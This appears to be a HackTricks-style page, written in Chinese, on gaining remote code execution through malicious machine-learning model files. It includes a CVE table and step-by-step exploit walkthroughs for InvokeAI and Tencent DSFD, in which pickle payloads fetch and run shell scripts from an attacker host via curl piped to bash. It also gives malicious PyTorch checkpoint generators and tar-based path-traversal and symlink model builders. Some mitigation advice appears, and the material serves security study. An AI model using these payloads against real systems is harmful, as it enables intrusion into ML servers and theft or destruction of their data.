# 模型 RCE

{{#include ../banners/hacktricks-training.md}}

## 将模型加载以实现 RCE

机器学习模型通常以不同格式共享，例如 ONNX、TensorFlow、PyTorch 等。这些模型可以被加载到开发者机器或生产系统中以供使用。通常模型不应包含恶意代码，但在某些情况下，模型可能被用来在系统上执行任意代码，这可能是设计特性或模型加载库中的漏洞所致。

在撰写本文时，以下是此类漏洞的一些示例：

| **Framework / 工具**        | **漏洞（如有 CVE）**                                                    | **RCE 利用向量**                                                                                                                           | **参考**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

此外，还有一些基于 Python pickle 的模型（例如 [PyTorch](https://github.com/pytorch/pytorch/security) 所使用的那些），如果没有使用 `weights_only=True` 加载，就可能被用于在系统上执行任意代码。因此，任何基于 pickle 的模型都可能特别容易受到此类攻击，即使它们未列在上表中。

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` 是用于 Stable-Diffusion 的流行开源 Web 界面。版本 **5.3.1 – 5.4.2** 暴露了 REST endpoint `/api/v2/models/install`，允许用户从任意 URL 下载并加载模型。

内部该端点最终调用：
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
当提供的文件是一个 **PyTorch checkpoint (`*.ckpt`)** 时，`torch.load` 会执行 **pickle 反序列化**。由于内容直接来自用户可控的 URL，攻击者可以在 checkpoint 内嵌入一个带有自定义 `__reduce__` 方法的恶意对象；该方法在 **反序列化期间** 被执行，导致在 InvokeAI server 上发生 **远程代码执行 (RCE)**。

该漏洞被分配为 **CVE-2024-12029**（CVSS 9.8，EPSS 61.17 %）。

#### 利用演练

1. 创建一个恶意的 checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 在你控制的 HTTP 服务器上托管 `payload.ckpt`（例如 `http://ATTACKER/payload.ckpt`）。
3. 触发易受攻击的端点（无需身份验证）：
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. 当 InvokeAI 下载该文件时，会调用 `torch.load()` → `os.system` gadget 被触发，攻击者在 InvokeAI 进程上下文中获得代码执行。

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` 自动化了整个流程。

#### 条件

•  InvokeAI 5.3.1-5.4.2（scan flag 默认 **false**）  
•  `/api/v2/models/install` 可被攻击者访问  
•  进程具有执行 shell 命令的权限

#### 缓解措施

* 升级到 **InvokeAI ≥ 5.4.3** – 补丁将 `scan=True` 设为默认，并在反序列化前执行恶意软件扫描。  
* 在程序中加载 checkpoints 时使用 `torch.load(file, weights_only=True)` 或新的 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) 辅助函数。  
* 对模型来源实施 allow-lists / 签名，并以最小权限运行服务。

> ⚠️ 请记住，**任何** 基于 Python pickle 的格式（包括许多 `.pt`, `.pkl`, `.ckpt`, `.pth` 文件）从不受信任来源反序列化本质上是不安全的。

---

如果必须在反向代理后运行旧版本 InvokeAI，以下是一个临时缓解示例：
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec 通过不安全的 `torch.load` 导致 RCE (CVE-2025-23298)

NVIDIA 的 Transformers4Rec（属于 Merlin）暴露了一个不安全的 checkpoint loader，它会在用户提供的路径上直接调用 `torch.load()`。因为 `torch.load` 依赖 Python 的 `pickle`，攻击者控制的检查点可以在反序列化过程中通过 reducer 执行任意代码。

易受影响的路径（修复前）： `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

为什么这会导致 RCE：在 Python 的 pickle 中，对象可以定义一个 reducer（`__reduce__`/`__setstate__`），返回一个可调用对象和参数。该可调用对象会在 unpickling 期间被执行。如果这样的对象存在于检查点中，它会在任何权重被使用之前运行。

最小恶意检查点示例:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
投递向量和影响范围：
- Trojanized checkpoints/models 通过 repos、buckets 或 artifact registries 共享
- 自动 resume/deploy pipelines 会自动加载 checkpoints
- 执行发生在 training/inference workers 内，通常具有提升的权限（例如 containers 中的 root）

修复：Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) 将直接的 `torch.load()` 替换为在 `transformers4rec/utils/serialization.py` 中实现的受限白名单反序列化器。新的加载器会验证类型/字段并防止在加载时调用任意可调用对象。

针对 PyTorch checkpoints 的防御性建议：
- 不要对不受信任的数据进行 unpickle。尽可能优先使用非可执行格式，如 [Safetensors](https://huggingface.co/docs/safetensors/index) 或 ONNX。
- 如果必须使用 PyTorch 序列化，确保 `weights_only=True`（在较新的 PyTorch 中受支持），或使用类似于 Transformers4Rec 补丁的自定义白名单 unpickler。
- 强制实施 model provenance/signatures 并对反序列化进行沙箱限制（seccomp/AppArmor；非 root 用户；受限的文件系统且无网络外发）。
- 在加载 checkpoint 时监控 ML 服务是否产生意外的子进程；跟踪 `torch.load()`/`pickle` 的使用。

POC 以及 漏洞/补丁 参考：
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## 例子 – 构造一个恶意的 PyTorch 模型

- 创建模型：
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 加载模型:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD 暴露了一个 `resnet` 端点，该端点反序列化用户控制的数据。ZDI 确认，远程攻击者可以诱使受害者加载恶意页面/文件，使其将精心构造的序列化 blob 推送到该端点，并以 `root` 身份触发反序列化，导致完全被攻陷。

利用流程类似于典型的 pickle 滥用：
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
任何在 deserialization 期间可达的 gadget（constructors、`__setstate__`、framework callbacks 等）都可以以相同方式被武器化，无论传输是 HTTP、WebSocket，还是被丢到受监控目录的文件。


## 模型到 Path Traversal

正如 [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) 所述，不同 AI frameworks 使用的大多数模型格式基于归档，通常为 `.zip`。因此，可能可以滥用这些格式来执行 path traversal 攻击，从而读取模型加载所在系统上的任意文件。

例如，使用下面的代码可以创建一个在加载时会在 `/tmp` 目录中创建文件的模型：
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
或者，使用下面的代码你可以创建一个模型，该模型在加载时会创建一个指向 `/tmp` 目录的符号链接：
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 深入研究：Keras .keras deserialization and gadget hunting

有关 .keras internals、Lambda-layer RCE、≤ 3.8 中的 arbitrary import 问题，以及 allowlist 内 post-fix gadget 发现的专门指南，请参见：

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## 参考资料

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
